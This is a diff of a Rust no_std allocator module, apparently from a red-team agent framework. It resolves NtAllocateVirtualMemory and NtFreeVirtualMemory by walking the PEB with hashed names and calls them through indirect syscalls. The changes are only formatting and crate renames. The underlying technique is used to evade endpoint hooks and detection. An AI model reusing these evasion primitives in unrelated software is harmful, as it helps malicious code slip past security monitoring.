@@ -1,18 +1,18 @@
 #![no_std]
 
-use core::alloc::{GlobalAlloc, Layout};
-use core::cell::UnsafeCell;
-use core::ffi::c_void;
-use core::ptr::null_mut;
-use core::sync::atomic::Ordering;
-use core::sync::atomic::{AtomicBool, AtomicIsize};
-use spin::Mutex;
+use core::{
+    alloc::{GlobalAlloc, Layout},
+    cell::UnsafeCell,
+    ffi::c_void,
+    ptr::null_mut,
+    sync::atomic::{AtomicBool, AtomicIsize, Ordering},
+};
 
+use kageshirei_indirect_syscall::run_syscall;
+use kageshirei_win32::ntapi::NtSyscall;
 use mod_agentcore::ldr::{ldr_function_addr, ldr_module_peb};
 use mod_hhtgates::get_syscall_number;
-
-use rs2_indirect_syscall::run_syscall;
-use rs2_win32::ntapi::NtSyscall;
+use spin::Mutex;
 
 // Atomic flag contains the last status of an NT syscall.
 pub static NT_ALLOCATOR_STATUS: AtomicIsize = AtomicIsize::new(0);
@@ -21,14 +21,13 @@ pub static NT_ALLOCATOR_STATUS: AtomicIsize = AtomicIsize::new(0);
 static INIT: AtomicBool = AtomicBool::new(false);
 
 // Static variables to hold the configuration and syscall information, wrapped in UnsafeCell for interior mutability.
-static mut NT_ALLOCATE_VIRTUAL_MEMORY_SYSCALL: Mutex<UnsafeCell<Option<NtSyscall>>> =
-    Mutex::new(UnsafeCell::new(None));
+static mut NT_ALLOCATE_VIRTUAL_MEMORY_SYSCALL: Mutex<UnsafeCell<Option<NtSyscall>>> = Mutex::new(UnsafeCell::new(None));
 
-static mut NT_FREE_VIRTUAL_MEMORY_SYSCALL: Mutex<UnsafeCell<Option<NtSyscall>>> =
-    Mutex::new(UnsafeCell::new(None));
+static mut NT_FREE_VIRTUAL_MEMORY_SYSCALL: Mutex<UnsafeCell<Option<NtSyscall>>> = Mutex::new(UnsafeCell::new(None));
 
 /// Unsafe function to perform the initialization of the static variables.
-/// This includes locating and storing the addresses and syscall numbers for `NtAllocateVirtualMemory` and `NtFreeVirtualMemory`.
+/// This includes locating and storing the addresses and syscall numbers for `NtAllocateVirtualMemory` and
+/// `NtFreeVirtualMemory`.
 pub unsafe fn initialize() {
     // Check if initialization has already occurred.
     if !INIT.load(Ordering::Acquire) {
@@ -40,12 +39,11 @@ pub unsafe fn initialize() {
         let ntdll_address = ldr_module_peb(NTDLL_HASH);
 
         // Initialize the syscall for NtAllocateVirtualMemory.
-        let alloc_syscall_address =
-            ldr_function_addr(ntdll_address, NT_ALLOCATE_VIRTUAL_MEMORY_DBJ2);
+        let alloc_syscall_address = ldr_function_addr(ntdll_address, NT_ALLOCATE_VIRTUAL_MEMORY_DBJ2);
         let alloc_syscall = NtSyscall {
             address: alloc_syscall_address,
-            number: get_syscall_number(alloc_syscall_address),
-            hash: NT_ALLOCATE_VIRTUAL_MEMORY_DBJ2,
+            number:  get_syscall_number(alloc_syscall_address),
+            hash:    NT_ALLOCATE_VIRTUAL_MEMORY_DBJ2,
         };
 
         *NT_ALLOCATE_VIRTUAL_MEMORY_SYSCALL.lock().get() = Some(alloc_syscall);
@@ -54,8 +52,8 @@ pub unsafe fn initialize() {
         let free_syscall_address = ldr_function_addr(ntdll_address, NT_FREE_VIRTUAL_MEMORY_DBJ2);
         let free_syscall = NtSyscall {
             address: free_syscall_address,
-            number: get_syscall_number(free_syscall_address),
-            hash: NT_FREE_VIRTUAL_MEMORY_DBJ2,
+            number:  get_syscall_number(free_syscall_address),
+            hash:    NT_FREE_VIRTUAL_MEMORY_DBJ2,
         };
 
         *NT_FREE_VIRTUAL_MEMORY_SYSCALL.lock().get() = Some(free_syscall);
@@ -166,11 +164,9 @@ unsafe impl GlobalAlloc for NtVirtualAlloc {
     /// This function is unsafe because undefined behavior can result
     /// if the caller does not ensure all the following:
     ///
-    /// * `ptr` must denote a block of memory currently allocated via
-    ///   this allocator,
+    /// * `ptr` must denote a block of memory currently allocated via this allocator,
     ///
-    /// * `layout` must be the same layout that was used
-    ///   to allocate that block of memory.
+    /// * `layout` must be the same layout that was used to allocate that block of memory.
     ///
     /// Note: `NtFreeVirtualMemory` will deallocate memory in multiples of the page size (usually 4096 bytes).
     unsafe fn dealloc(&self, ptr: *mut u8, layout: Layout) {
